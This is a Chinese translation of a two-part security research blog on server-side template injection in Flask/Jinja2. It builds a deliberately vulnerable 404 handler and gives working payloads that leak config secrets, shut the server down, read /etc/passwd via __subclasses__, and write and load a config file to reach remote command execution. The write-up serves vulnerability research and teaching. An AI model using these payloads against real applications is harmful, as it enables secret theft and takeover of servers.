# Exploring SSTI in Flask/Jinja2

Part1:[https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/](https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/)  
Part2:[https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)

Part 1
------

如果你从未听过服务端模板注入（SSTI）攻击，或者不太了解它是个什么东西的话，建议在继续浏览本文之前可以阅读一下[James Kettle](https://twitter.com/albinowax)写的[这篇文章](http://blog.portswigger.net/2015/08/server-side-template-injection.html)。

作为安全从业者，我们都是在帮助企业做一些基于风险的决策。因为风险是影响和属性的产物，所以我们在不知道一个漏洞的真实影响力的情况下，无法正确地计算出相应的风险值。作为一个经常使用Flask框架的开发者，James的研究促使我去弄清楚，SSTI对基于Flask/Jinja2开发堆栈的应用程序的影响有多大。这篇文章就是我研究的结果。如果你想在深入之前了解更多的背景知识，你可以查看一下[Ryan Reid](https://twitter.com/_aur3lius)写的[这篇文章](https://nvisium.com/blog/2015/12/07/injecting-flask/)，其中提供了在Flask/Jinja2应用中更多有关SSTI的信息。

0x00 Setup
==========

* * *

为了评估在Flask/Jinja2堆栈中SSTI的影响，让我们建立一个小小的poc程序，代码如下。

```
@app.errorhandler(404)
def page_not_found(e):
    template = '''{%% extends "layout.html" %%}
{%% block body %%}
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
    <h3>%s</h3>
    </div>
{%% endblock %%}
''' % (request.url)
    return render_template_string(template), 404

```

在这段代码的背后，该开发者觉得为一个小小的404页面创建一个单独的模板文件可能会有些愚蠢了，所以他就在404视图功能当中创建了一个模板字符串。该开发者想要回显出用户输入的错误URL；但该开发者选择使用字符串格式化，来将URL动态地加入到模板字符串中，而不是通过`render_template_string`函数将URL传递进入模板内容当中。感觉相当合理，对不对？这是我见过最糟的了。

在测试这项功能的时候，我们看到了预期的效果。

![](http://drops.javaweb.org/uploads/images/f8a75c25a7cafb2032e64a2341905bc001f4f5e9.jpg)

看到这种情况大多数人马上会想到XSS，他们的想法是正确的。在URL的尾部加上`<script>alert(42)</script>`就触发了一个XSS漏洞。

![](http://drops.javaweb.org/uploads/images/48430bab07998f27f2991e65eefddb10c580f862.jpg)

目标代码很容易被XSS，但是在James的文章中，他指出XSS很有可是SSTI的一个迹象。现在这种情况就是一个很好的例子。如果我们更加深入一点，在URL的末尾添加上`{{ 7+7 }}`，我们可以看到模板引擎计算了数学表达式，应用程序在响应的时候将其解析成`14`。

![](http://drops.javaweb.org/uploads/images/50d2dea3b7b52ddfd80123b3ce1f59da746a9f71.jpg)

我们现在已经在目标应用程序中发现了SSTI漏洞。

0x01 Analysis
=============

* * *

由于我们要得到一个可用的exp，下一步就是深入到模板环境当中，通过SSTI漏洞来寻找出可供攻击者利用的点。我们修改一下poc程序中存在漏洞的预览功能，如下所示。

```
@app.errorhandler(404)
def page_not_found(e):
    template = '''{%% extends "layout.html" %%}
{%% block body %%}
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>
    </div>
{%% endblock %%}
''' % (request.url)
    return render_template_string(template,
        dir=dir,
        help=help,
        locals=locals,
    ), 404

```

我们将`dir`,`help`,和`locals`这些内建函数传入到`render_template_string`函数中，通过函数调用将其加入到模板环境中，从而使用它们通过漏洞进行内省，来发现模板程序上可利用的点。

让我们稍微暂停一下，探讨探讨文档中关于模板内容是怎么说的。这里有几个模板内容中对象的最终来源。

1.  [Jinja globals](http://jinja.pocoo.org/docs/dev/templates/#builtin-globals)
2.  [Flask template globals](http://flask.pocoo.org/docs/0.10/templating/#standard-context)
3.  开发者自己添加的对象

我们最关心的是第1点和第2点，因为它们通常都是默认的设置，在我们发现存在SSTI的任何Flask/Jinja2堆栈程序中都是可用的。第3点是依赖于应用程序的，而且有很多种实现的方式。这篇[stackoverflow discussion](http://stackoverflow.com/questions/6036082/call-a-python-function-from-jinja2)的讨论当中就包含了几个例子。虽然我们在这篇文章中不会深入地讨论第3点，但这也是在代码审计相关Flask/Jinja2堆栈应用程序源码时必须要考虑到的。

为了使用内省继续研究，我们的方法应当如下。

1.  阅读文档！
2.  使用`dir`内省`locals`对象，在模板内容中寻找一切可用的东西。
3.  使用`dir`和`help`深入了解所有的对象
4.  分析任何有趣的Python源代码（毕竟在堆栈中一切都是开源的）

0x02 Results
============

* * *

通过内省`request`对象我们来进行第一个有趣的探索发现。`request`对象是一个Flask模板全局变量，代表“当前请求对象（`flask.request`）”。当你在视图中访问request对象时，它包含了你预期想看到的所有信息。在`request`对象中有一个叫做`environ`的对象。`request.environ`是一个字典，其中包含和服务器环境相关的对象。该字典当中有一个`shutdown_server`的方法，相应的key值为`werkzeug.server.shutdown`。所以猜猜看我们向服务端注入`{{ request.environ['werkzeug.server.shutdown']() }}`会发生什么？没错，会产生一个及其低级别的拒绝服务。当使用gunicorn运行应用程序时就不会存在这个方法，所以漏洞就有可能受到开发环境的限制。

我们第二个有趣的发现来自于内省`config`对象。`config`对象是一个Flask模板全局变量，代表“当前配置对象（`flask.config`）”。它是一个类似于字典的对象，其中包含了应用程序所有的配置值。在大多数情况下，会包含数据库连接字符串，第三方服务凭据，`SECRET_KEY`之类的敏感信息。注入payload`{{ config.items() }}`就可以轻松查看这些配置了。

![](http://drops.javaweb.org/uploads/images/f137d1579bc50144391c8819a74448ff89579b23.jpg)

不要认为在环境变量中存储这些配置选项就可以抵御这种信息泄露。一旦相关的配置值被框架解析后，`config`对象就会把它们全部包含进去。

我们最有趣的发现也来自于内省`config`对象。虽然`config`对象是一个类似于字典的对象，但它也是包含若干独特方法的子类：`from_envvar`，`from_object`，`from_pyfile`，以及`root_path`。最后让我们深入进去看看源代码。以下的代码是`Config`对象中的`from_object`方法，`flask/config.py`。

```
    def from_object(self, obj):
        """Updates the values from the given object.  An object can be of one
        of the following two types:    

        -   a string: in this case the object with that name will be imported
        -   an actual object reference: that object is used directly    

        Objects are usually either modules or classes.    

        Just the uppercase variables in that object are stored in the config.
        Example usage::    

            app.config.from_object('yourapplication.default_config')
            from yourapplication import default_config
            app.config.from_object(default_config)    

        You should not use this function to load the actual configuration but
        rather configuration defaults.  The actual config should be loaded
        with :meth:`from_pyfile` and ideally from a location not within the
        package because the package might be installed system wide.    

        :param obj: an import name or object
        """
        if isinstance(obj, string_types):
            obj = import_string(obj)
        for key in dir(obj):
            if key.isupper():
                self[key] = getattr(obj, key)    

    def __repr__(self):
        return '<%s %s>' % (self.__class__.__name__, dict.__repr__(self))

```

我们可以看到，如果我们将字符串对象传递给`from_object`方法，它会将该字符串传递给`werkzeug/utils.py`模块的`import_string`方法，该方法会从路径中导入名字匹配的任何模块并将其返回。

```
def import_string(import_name, silent=False):
    """Imports an object based on a string.  This is useful if you want to
    use import paths as endpoints or something similar.  An import path can
    be specified either in dotted notation (``xml.sax.saxutils.escape``)
    or with a colon as object delimiter (``xml.sax.saxutils:escape``).    

    If `silent` is True the return value will be `None` if the import fails.    

    :param import_name: the dotted name for the object to import.
    :param silent: if set to `True` import errors are ignored and
                   `None` is returned instead.
    :return: imported object
    """
    # force the import name to automatically convert to strings
    # __import__ is not able to handle unicode strings in the fromlist
    # if the module is a package
    import_name = str(import_name).replace(':', '.')
    try:
        try:
            __import__(import_name)
        except ImportError:
            if '.' not in import_name:
                raise
        else:
            return sys.modules[import_name]    

        module_name, obj_name = import_name.rsplit('.', 1)
        try:
            module = __import__(module_name, None, None, [obj_name])
        except ImportError:
            # support importing modules not yet set up by the parent module
            # (or package for that matter)
            module = import_string(module_name)    

        try:
            return getattr(module, obj_name)
        except AttributeError as e:
            raise ImportError(e)    

    except ImportError as e:
        if not silent:
            reraise(
                ImportStringError,
                ImportStringError(import_name, e),
                sys.exc_info()[2])

```

对于新加载的模块，`from_object`方法会将那些变量名全是大写的属性添加到`config`对象中。其中有趣的地方就是，添加到`config`对象的属性会保持原有的类型，这意味着通过`config`对象，我们可以从模板内容中调用添加的函数。为了证明这一点，我们使用SSTI漏洞注入`{{ config.items() }}`，可以看到当前的整个配置选项。

![](http://drops.javaweb.org/uploads/images/ded43a35613f33a4fd9633f469245e4b4bda2fb5.jpg)

再注入`{{ config.from_object('os') }}`，这下就会在`config`对象中添加那些在`os`库中变量名全是大写的属性。再次注入`{{ config.items() }}`，就可以发现新的配置选项。同样也需要注意这些配置选项的类型。

![](http://drops.javaweb.org/uploads/images/95483db32a64a11d360d0372913cc7532c9b7121.jpg)

现在通过SSTI漏洞，我们可以调用添加到`config`对象中的任何可调用对象。下一步就是寻找可导入模块的相关功能，再加以利用逃逸出模板沙盒。

以下的脚本复制了`from_object`和`import_string`的功能，并分析整个Python标准库中可导入的项目。

```
#!/usr/bin/env python    

from stdlib_list import stdlib_list
import argparse
import sys    

def import_string(import_name, silent=True):
    import_name = str(import_name).replace(':', '.')
    try:
        try:
            __import__(import_name)
        except ImportError:
            if '.' not in import_name:
                raise
        else:
            return sys.modules[import_name]    

        module_name, obj_name = import_name.rsplit('.', 1)
        try:
            module = __import__(module_name, None, None, [obj_name])
        except ImportError:
            # support importing modules not yet set up by the parent module
            # (or package for that matter)
            module = import_string(module_name)    

        try:
            return getattr(module, obj_name)
        except AttributeError as e:
            raise ImportError(e)    

    except ImportError as e:
        if not silent:
            raise    

class ScanManager(object):    

    def __init__(self, version='2.6'):
        self.libs = stdlib_list(version)    

    def from_object(self, obj):
        obj = import_string(obj)
        config = {}
        for key in dir(obj):
            if key.isupper():
                config[key] = getattr(obj, key)
        return config    

    def scan_source(self):
        for lib in self.libs:
            config = self.from_object(lib)
            if config:
                conflen = len(max(config.keys(), key=len))
                for key in sorted(config.keys()):
                    print('[{0}] {1} => {2}'.format(lib, key.ljust(conflen), repr(config[key])))    

def main():
    # parse arguments
    ap = argparse.ArgumentParser()
    ap.add_argument('version')
    args = ap.parse_args()
    # creat a scanner instance
    sm = ScanManager(args.version)
    print('\n[{module}] {config key} => {config value}\n')
    sm.scan_source()    

# start of main code
if __name__ == '__main__':
    main()

```

以下是脚本使用Python 2.7运行后的简短输出，其中包括了大多数可导入的有趣项目。

```
(venv)macbook-pro:search lanmaster$ ./search.py 2.7    

[{module}] {config key} => {config value}    

...
[ctypes] CFUNCTYPE               => <function CFUNCTYPE at 0x10c4dfb90>
...
[ctypes] PYFUNCTYPE              => <function PYFUNCTYPE at 0x10c4dff50>
...
[distutils.archive_util] ARCHIVE_FORMATS => {'gztar': (<function make_tarball at 0x10c5f9d70>, [('compress', 'gzip')], "gzip'ed tar-file"), 'ztar': (<function make_tarball at 0x10c5f9d70>, [('compress', 'compress')], 'compressed tar file'), 'bztar': (<function make_tarball at 0x10c5f9d70>, [('compress', 'bzip2')], "bzip2'ed tar-file"), 'zip': (<function make_zipfile at 0x10c5f9de8>, [], 'ZIP file'), 'tar': (<function make_tarball at 0x10c5f9d70>, [('compress', None)], 'uncompressed tar file')}
...
[ftplib] FTP                     => <class ftplib.FTP at 0x10cba7598>
[ftplib] FTP_TLS                 => <class ftplib.FTP_TLS at 0x10cba7600>
...
[httplib] HTTP                            => <class httplib.HTTP at 0x10b3e96d0>
[httplib] HTTPS                           => <class httplib.HTTPS at 0x10b3e97a0>
...
[ic] IC => <class ic.IC at 0x10cbf9390>
...
[shutil] _ARCHIVE_FORMATS => {'gztar': (<function _make_tarball at 0x10a860410>, [('compress', 'gzip')], "gzip'ed tar-file"), 'bztar': (<function _make_tarball at 0x10a860410>, [('compress', 'bzip2')], "bzip2'ed tar-file"), 'zip': (<function _make_zipfile at 0x10a860500>, [], 'ZIP file'), 'tar': (<function _make_tarball at 0x10a860410>, [('compress', None)], 'uncompressed tar file')}
...
[xml language=".dom.pulldom"][/xml] SAX2DOM                => <class xml.dom.pulldom.SAX2DOM at 0x10d1028d8>
...
[xml language=".etree.ElementTree"][/xml] XML        => <function XML at 0x10d138de8>
[xml language=".etree.ElementTree"][/xml] XMLID      => <function XMLID at 0x10d13e050>
...

```

在这里，我们对一些有趣的项目使用我们的方法，以期望寻找逃逸模板沙盒的办法。

总而言之，我没能够从这些项目中找到沙盒逃逸的办法。但是为了共享研究，下面给出我对其研究的一些附加信息。另外请注意，我没有穷尽所有的可能性，还是有进一步研究的可能性。

ftplib
------

这里我们有使用`ftplib.FTP`对象的可能性，可以回连至我们控制的一台服务器，并且从受影响的服务器上传文件。我们也可以从一台服务器上下载文件到受影响的服务器上，并且使用`config.from_pyfile`方法执行相关内容。对ftplib的文档和源代码分析表明，ftplib需要打开文件句柄才能做到以上几点，因为在模板沙盒中`open`内建函数是禁止的，似乎并没有创建文件句柄的方法。

httplib
-------

这里我们有使用`httplib.HTTP`对象的可能性，可以使用文件协议`file://`来加载本地文件系统上文件的URL。不幸的是，`httplib`不支持文件协议处理程序。

xml.etree.ElementTree
---------------------

这里我们有使用`xml.etree.ElementTree.XML`对象的可能型，可以使用用户自定义的实体从文件系统中加载文件。然而，从[这里](https://docs.python.org/2/library/xml.html#xml-vulnerabilities)可以知道，`etree`不支持用户自定义的实体。

xml.dom.pulldom
---------------

虽然`xml.etree.ElementTree`模块不支持用户自定义的实体，但是`pulldom`模块支持。然而我们还是受限于`xml.dom.pulldom.SAX2DOM`类，因为其并没有通过对象接口加载XML的方法。

0x03 Conclusion
===============

* * *

虽然我们还没有发现逃逸模板沙盒的方法，但我们已经在Flask/Jinja2开发堆栈中，确定SSTI漏洞的影响有所进展。我肯定这里有些额外的挖掘工作需要去做，我打算继续下去，但我也鼓励其他人进行挖掘和探索。当我在研究中发现有意思的项目的时候，我会在这里更新相关文章。

Part 2
======

最近我写了一片[文章](http://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/)，是关于在使用Flask/Jinja2开发堆栈的应用程序中，探索服务端模板注入攻击（SSTI）的真实影响。我最初的目标是找到访问文件或操作系统的方法。虽然我之前是无法做到的，但是借由一些facebook对于第一篇文章的反馈，我已经能够实现我的目标了。本文就是我进一步研究的结果。

0x00 The Nudge
==============

* * *

对于最初的那篇文章，[Nicolas G](https://twitter.com/_qll_)发表了如下推文。

![](http://drops.javaweb.org/uploads/images/da25b75444ae1d4a449f90e9d92a6e204b403ffb.jpg)

如果你稍微使用一下这个payload，你很快就会发现它是行不通的。其中有好几个原因，我稍后会解释一下。然而关键问题就在于，这个payload使用了几个非常重要的内省组件，而在之前的研究中我们将其忽略了：`__mro__`和`__subclasses__`属性。

**声明**：以下的解释都是处于一个较高的水平。我并不希望表现得我很了解这些组件的样子。当我在处理一个语言或框架内部结构中的模糊部分时，大多数情况下我都只是尝试一下，看它是否会像我预期的那样做出反应，但我并不全知道结果背后的原因是什么。我仍在学习这些属性背后的缘由，但我还是想给你一些相关介绍。

`__mro__`中的MRO代表方法解析顺序，并且在[这里](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__)定义为，“是一个包含类的元组，而其中的类就是在方法解析的过程中在寻找父类时需要考虑的类”。`__mro__`属性以包含类的元组来显示对象的继承关系，它的父类，父类的父类，一直向上到`object`（如果是使用新式类的话）。它是每个对象的元类属性，但它却是一个隐藏属性，因为Python在进行内省时明确地将它从`dir`的输出中移除了（[见Objects/object.c的第1812行](http://hg.python.org/cpython/file/3a1db0d2747e/Objects/object.c#l1812)）。

`__subclasses__`属性则在[这里](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__)被定义为一个方法，“每个新式类保留对其直接子类的一个弱引用列表。此方法返回那些引用还存在的子类”。

简而言之，`__mro__`让我们到达当前Python环境中的继承对象树，而`__subclasses__`又让我们回来了。所以对于Flask/Jinja2的SSTI漏洞更好的利用会造成什么影响呢？让我们以新式的对象开始，例如字符串类型，可以使用`__mro__`达到继承树的顶端object类，然后再使用`__subclasses__`，可以在Python环境中向下达到每一个新式对象。是的，这就使我们能够访问到当前Python环境中加载的每一个类。所以我们该如何利用这个新get的技能？

0x02 Exploitation
=================

* * *

在这里需要考虑一些事情。Python环境当中将会包括：

1.  所有Flask应用程序产生的对象
2.  目标程序自定义的对象

我们着眼于更普遍的漏洞利用，所以我们想要搭建尽可能接近原生态Flask的测试环境。我们向应用程序中导入的库和第三方模块越多，我们攻击向量的普遍性就越小。我们之前的poc程序很适合用来测试，所以我们就继续使用它。

我们将要做的就是，在不修改任何源代码的情况下寻找一个exp向量。在之前的文章中，我们向漏洞中添加了一些功能来进行内省。但在这里就不再是必须的了。

我们要做的第一件事就是，选择一个新式对象，用它来访问`object`类。我们简单地使用`''`，一个空字符串，对象类型为`str`。然后我们就可以使用`__mro__`属性来访问对象的父类。将`{{ ''.__class__.__mro__ }}`作为payload注入到SSTI漏洞点当中。

![](http://drops.javaweb.org/uploads/images/ec2c827ffc3e3e15c9fe51debe608aaa8b3a0523.jpg)

可以看到返回了我们之前讨论过的元组。因为我们要回退到object类，我们就使用索引2来选择object类。现在我们到达了object类，我们使用`__subclasses__`属性来dump应用程序中使用的所有类。将`{{ ''.__class__.__mro__[2].__subclasses__() }}`注入到SSTI漏洞点当中。

![](http://drops.javaweb.org/uploads/images/61a11a09335d6e5abb056075b49f8903820e1090.jpg)

正如你所见，这里输出了很多东西。在我使用的目标程序中，有572个可用的类。这些会让事情变得棘手，而且也是之前推特当中payload不能运行的原因。要记住，并不是每个应用程序的Python环境都是一样的。我们的目标就是寻找有用的方法来访问相关的文件或操作系统。在所有的应用程序当中，不可能都使用类似于用`subprocess.Popen`这样不常见的类，换一种情况就有可能无法利用了，就像之前那个推特中的payload一样，就我发现的而言，在原生态的Flask中这种payload是无法利用的。幸运的是，可用利用原生态Flask的特性来让我们实现类似的行为。

如果你梳理了一下之前payload的输出，你就会发现`<type 'file'>`这个类。这是一个对文件系统访问的关键点。尽管`open`是创建`file`对象后的内建函数，但是`file`类也能够实例化文件对象，而且如果我们实例化了一个文件对象，那么我们就可用使用类似于`read`的方法来读取相关内容。为了证明这一点，找到`file`类的索引，在我的环境中`<type 'file'>`类的索引是40，我们就注入`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`。

![](http://drops.javaweb.org/uploads/images/4ecbd57733224e635aa1dcc45ee4b41a54f69149.jpg)

所以现在我们就证明了，通过Flask/Jinja2中的SSTI进行任意文件读取是有可能的，但是我们还没有完全搞定。在这里我的目标是远程代码/命令执行。

在上一篇文章当中提到了好几种`config`对象的方法，可以将相关对象加载进入Flask的配置环境中。其中一个方法就是`from_pyfile`方法。以下的代码是`Config`类中的`from_pyfile`方法，`flask/config.py`。

```
    def from_pyfile(self, filename, silent=False):
        """Updates the values in the config from a Python file.  This function
        behaves as if the file was imported as module with the
        :meth:`from_object` function.    

        :param filename: the filename of the config.  This can either be an
                         absolute filename or a filename relative to the
                         root path.
        :param silent: set to `True` if you want silent failure for missing
                       files.    

        .. versionadded:: 0.7
           `silent` parameter.
        """
        filename = os.path.join(self.root_path, filename)
        d = imp.new_module('config')
        d.__file__ = filename
        try:
            with open(filename) as config_file:
                exec(compile(config_file.read(), filename, 'exec'), d.__dict__)
        except IOError as e:
            if silent and e.errno in (errno.ENOENT, errno.EISDIR):
                return False
            e.strerror = 'Unable to load configuration file (%s)' % e.strerror
            raise
        self.from_object(d)
        return True

```

这里有一对有意思的东西。最明显的就是将一个文件的路径作为参数传递进去，并且针对文件中的内容使用`compile`函数。如果我们能向操作系统中写文件的话那事情就变得简单了，不是吗？嗯，正如我们刚才讨论过的，我们可以做到！我们可以使用之前提到的`file`类不仅去读文件，而且也可以向目标服务器的可写入路径中写文件。然后我们再通过SSTI漏洞调用`from_pyfile`方法去`compile`文件并执行其中的内容。这就是一个二次进攻。首先，将`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('<malicious code here>'') }}`注入到SSTI漏洞点。然后在通过注入`{{ config.from_pyfile('/tmp/owned.cfg') }}`调用编译过程。该代码在编译时将会被执行。这就实现了远程代码执行。

让我来更深入地研究一下。虽然执行代码已经足够了，但是我们为了执行每个代码块必须经过多个步骤，这些过程是很乏味的。让我们充分地利用`from_pyfile`方法来达到我们预期的目的，并且向config对象中添加一些有用的东西。将`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}`注入到SSTI漏洞点。这就会在远程服务器上写一个文件，当其被编译的时候，就可以从`subprocess`模块中导入`check_output`方法，并将其设置成一个名为`RUNCMD`变量。如果你回忆一下之前的文章，你就会知道因为`RUNCMD`为一个大写的变量名，就可以被添加到Flask`config`对象中。

![](http://drops.javaweb.org/uploads/images/b409311aad6274551b95822ccb78279cfb7ac8da.jpg)

注入`{{ config.from_pyfile('/tmp/owned.cfg') }}`来将新的项目添加到config对象中。注意以下两幅图一前一后的差异。

![](http://drops.javaweb.org/uploads/images/4b685002daf3b71f9a2ae1fb18554c6040c8df43.jpg)

![](http://drops.javaweb.org/uploads/images/6d3d8b73930fd6ff030277606d09a0108b23a1d4.jpg)

现在我们就可以调用新的配置选项来执行远程命令了。可以将`{{ config['RUNCMD']('/usr/bin/id',shell=True) }}`注入到SSTI漏洞点来进行证明。

![](http://drops.javaweb.org/uploads/images/189c980bc25ac71353271498a2e351ce478c0fca.jpg)

远程代码成功执行。

0x02 Conclusion
===============

* * *

现在，我们可以进行Flask/Jinja2模板沙盒逃逸了，并且可以得出结论：SSTI在Flask/Jinja2环境中的影响是巨大的。